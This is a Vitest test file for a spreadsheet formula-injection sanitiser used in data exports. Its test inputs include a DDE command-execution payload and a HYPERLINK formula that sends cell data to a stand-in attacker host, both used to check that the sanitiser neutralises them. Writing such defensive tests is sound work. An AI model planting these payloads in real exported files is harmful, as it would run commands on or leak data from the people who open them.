import { describe, it, expect } from 'vitest'
import { sanitizeCell } from '../lib/exportUtils.js'

// Spreadsheet/CSV formula-injection defence: any string cell beginning with a
// formula-trigger character (= + - @) or a leading tab/CR must be neutralised
// with a leading apostrophe so Excel/Sheets/LibreOffice treat it as text.
describe('sanitizeCell — spreadsheet formula injection defence', () => {
  it('prefixes leading = (formula/command injection)', () => {
    expect(sanitizeCell('=cmd|\'/c calc\'!A1')).toBe("'=cmd|'/c calc'!A1")
  })

  it('prefixes leading + ', () => {
    expect(sanitizeCell('+1')).toBe("'+1")
  })

  it('prefixes leading - ', () => {
    expect(sanitizeCell('-1')).toBe("'-1")
  })

  it('prefixes leading @ (SUM/lookup injection)', () => {
    expect(sanitizeCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
  })

  it('prefixes leading tab control char', () => {
    expect(sanitizeCell('\tfoo')).toBe("'\tfoo")
  })

  it('prefixes leading carriage return control char', () => {
    expect(sanitizeCell('\rfoo')).toBe("'\rfoo")
  })

  it('prefixes =HYPERLINK exfiltration payloads', () => {
    expect(sanitizeCell('=HYPERLINK("http://evil.example/?leak="&A1,"click")'))
      .toBe('\'=HYPERLINK("http://evil.example/?leak="&A1,"click")')
  })

  it('leaves normal strings unchanged', () => {
    expect(sanitizeCell('Riyadh Depot')).toBe('Riyadh Depot')
    expect(sanitizeCell('Michelin XZE2')).toBe('Michelin XZE2')
    expect(sanitizeCell('a=b (mid-string equals is safe)')).toBe('a=b (mid-string equals is safe)')
  })

  it('leaves numbers-as-strings that do not start with a trigger unchanged, but guards signed numeric strings', () => {
    expect(sanitizeCell('1234')).toBe('1234')
    expect(sanitizeCell('12.5%')).toBe('12.5%')
    // A number rendered as a string with a leading sign is still dangerous.
    expect(sanitizeCell('-45.2')).toBe("'-45.2")
    expect(sanitizeCell('+45.2')).toBe("'+45.2")
  })

  it('leaves non-string values (numbers/booleans) unchanged', () => {
    expect(sanitizeCell(1234)).toBe(1234)
    expect(sanitizeCell(-45.2)).toBe(-45.2)
    expect(sanitizeCell(0)).toBe(0)
    expect(sanitizeCell(true)).toBe(true)
  })

  it('is safe for empty string, null and undefined', () => {
    expect(sanitizeCell('')).toBe('')
    expect(sanitizeCell(null)).toBe(null)
    expect(sanitizeCell(undefined)).toBe(undefined)
  })
})
